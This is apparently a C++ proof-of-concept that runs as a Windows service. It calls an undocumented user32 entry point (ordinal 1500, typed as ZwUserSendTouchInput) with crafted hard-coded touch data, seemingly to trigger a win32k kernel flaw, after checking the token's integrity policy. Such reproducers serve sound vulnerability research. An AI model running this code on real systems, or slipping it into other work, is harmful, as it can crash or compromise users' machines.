#include "stdafx.h"
#include <conio.h>
#include <stdio.h>
#include <iostream>
#include <vector>

using namespace std;

struct TouchData {
  DWORD a1;
  DWORD a2;
  DWORD a3;
  DWORD a4;
  DWORD b1;
  DWORD b2;
  DWORD b3;
  DWORD b4;
  DWORD c1;
  DWORD c2;
  DWORD c3;
  DWORD c4;
};

typedef NTSTATUS (*t_ZwUserSendTouchInput)(HWND hWnd, int rdx, TouchData* touchData, DWORD touchDataSize);

HANDLER_FUNCTION_EX HandlerProc;
SERVICE_MAIN_FUNCTIONW Run;

auto hmod = LoadLibrary(L"user32");
auto procAddr = (t_ZwUserSendTouchInput)GetProcAddress(hmod, LPCSTR(1500));
auto hService = RegisterServiceCtrlHandlerExW(L"Testbed", HandlerProc, nullptr);
SERVICE_TABLE_ENTRY gc_table[] = {{L"Testbed", Run}, {nullptr, nullptr}};

DWORD __stdcall HandlerProc(DWORD dwControl, DWORD dwEventType, void* lpEventData, void* lpContext) {
  return 0;
}

void __stdcall Run(DWORD dwNumServicesArgs, LPWSTR *lpServiceArgVectors) {
  DWORD rs;
  if(!procAddr)
    throw std::runtime_error("Cannot find touch input entrypoint");

  HANDLE token;
  if(!OpenProcessToken(GetCurrentProcess(), GENERIC_ALL, &token))
    throw std::runtime_error("Could not open process token");

  // Verify that our mandatory policy token is turned off:
  TOKEN_MANDATORY_POLICY policy;
  GetTokenInformation(token, TokenMandatoryPolicy, &policy, sizeof(policy), &rs);

  if(policy.Policy) {
    OutputDebugString(L"Mandatory policy flag was nonzero\n");
    return;
  }

  CloseHandle(token);

  HWND hWnd = GetDesktopWindow();
  TouchData data;
  data.a1 = 0x00017609;
  data.a2 = 0x0000b7e5;
  data.a3 = 0x004701a1;
  data.a4 = 0x00000000;
  data.b1 = 0x00000002;
  data.b2 = 0x0000001a;
  data.b3 = 0x00000000;
  data.b4 = 0x0090541b;
  data.c1 = 0x00000000;
  data.c2 = 0x00000000;
  data.c3 = 0x00000000;
  data.c4 = 0x00000000;

  cerr << procAddr(hWnd, 1, &data, sizeof(data)) << endl
       << GetLastError() << endl;
}

int main(int argc, char* argv[]) {
  OutputDebugString(L"Test test\n");
  StartServiceCtrlDispatcher(gc_table);

	return 0;
}

